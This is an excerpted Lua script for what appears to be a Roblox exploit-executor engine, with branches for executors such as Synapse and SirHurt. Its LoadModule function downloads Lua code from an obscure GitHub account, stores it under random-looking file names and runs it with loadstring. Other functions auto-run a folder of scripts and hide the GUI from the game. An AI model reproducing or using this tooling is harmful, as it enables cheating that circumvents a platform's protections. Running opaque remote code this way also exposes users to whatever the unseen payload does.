local Engine = {}
LoadModule = function(path,request)
        if not isfile(path) then
            local e = game:HttpGet(request)
            writefile(path,tostring(e))
            return loadstring(readfile(path))()
        else
            return loadstring(readfile(path))()
        end
end
Engine.AssertFolders = function(item)
...
Engine.AssertFiles = function(patch, item)
    for i, v in pairs(item) do
      if not isfile(patch .. v) then
        writefile(patch .. v, "")
      end
    end
end
...
Engine.Init = function(Identity)
    local assertfolder = function(v)
      if not isfolder(v) then
        makefolder(v)
      end
    end
    local assertfile = function(file, source)
    ...
    if Identity then
	    ...
	    Engine.AssertFolders({"ExecutorConfigs/Community","ExecutorConfigs/Community/Infinite Yield","ExecutorConfigs/Community/Dex V4","ExecutorConfigs/Community/CMD X"})
            LoadModule("ExecutorConfigs/bin/rSQzWfGnFhL7VJvaamB5E5GhcDmb4WvyXAUPMFK4aMNM4D5UjGNjx6qUf46T","https://raw.githubusercontent.com/aA910FLsaIASFO1/gits/refs/heads/main/q90UP5N0CggF46LAUBW6ca3S3ACC4Ghqb5wpNNuHAQxrhFSHfXNcxmdcKMUue1jmSZfXKcAkRVHCckV6iRPzkTUWW0fjUjAeL0Lb.lua")
            local e  = loadstring(readfile("ExecutorConfigs/bin/rSQzWfGnFhL7VJvaamB5E5GhcDmb4WvyXAUPMFK4aMNM4D5UjGNjx6qUf46T"))()
    	    e.Init()
        ...
        elseif Identity == "SYNAPSE" then
            LoadModule("ExecutorConfigs/bin/xBDE8LGMNH9zC1ebj3rEWWbHgtiBMa.dat","https://raw.githubusercontent.com/aA910FLsaIASFO1/gits/refs/heads/main/3eVLD0MnfMAt7WVAzkC2u0X2wexWb2SF69bveAJcCWjhygWWe0JaWZ3ScUh96X7Gt3qkg2RdAJv3r04VGCxPB0Kt6w7ieXnC7XPd.lua")
            LoadModule("ExecutorConfigs/bin/0f00000.lua","https://raw.githubusercontent.com/aA910FLsaIASFO1/gits/refs/heads/main/JNDUcQAZPzPT7MaRKpaqVmhgujB5wzFHpMKP1VqiPPuSg6NJxy16377nE73rjkpAdMnxNjizP6tziS9wXK4rMeMVZHFeBujFTLpp.lua")
        elseif Identity == "SIRHURT" then
            
            
      end
    end
  end
Engine.Load = function(id, http)
    if http then
...
Engine.Secure = function(item)
    protect = function(item)
      local protect_gui = get_hidden_gui or gethui or syn and syn.protect_gui
      if protect_gui then
        pcall(protect_gui(item))
      else
        if game:GetService("CoreGui").RobloxGui then
          item.Parent = game:GetService("CoreGui").RobloxGui
        else
          item.Parent = game:GetService("CoreGui")
        end
...
Engine.Prompt = function(Warn_Type, Content, Args)
    ...
    local nbt = function(titl, fun)
      ...
      anim(opt1)
      opt1.MouseButton1Click:Connect(
        function()
...
Engine.Execute = function(str, args)
    if args.Name then
      NAME = args.Name
    else
        NAME = ""
    ...
    --[[xpcall(
      function()
        loadstring(tostring(str))()
      end,
      function(err)
        if args.callback then
          print("callback")
          return args.callback(tostring(err))
        else
          game:GetService("StarterGui"):SetCore(
            "SendNotification",
            {
...
Engine.AutoExecute = function()
    getgenv().HxAuto = true
    _G.HxAuto = true
    for i, v in pairs(listfiles("AutoExec")) do
      xpcall(
        function()
          loadstring(tostring(readfile(v)))()
        end,
        function(err)
          game:GetService("StarterGui"):SetCore(
            "SendNotification",
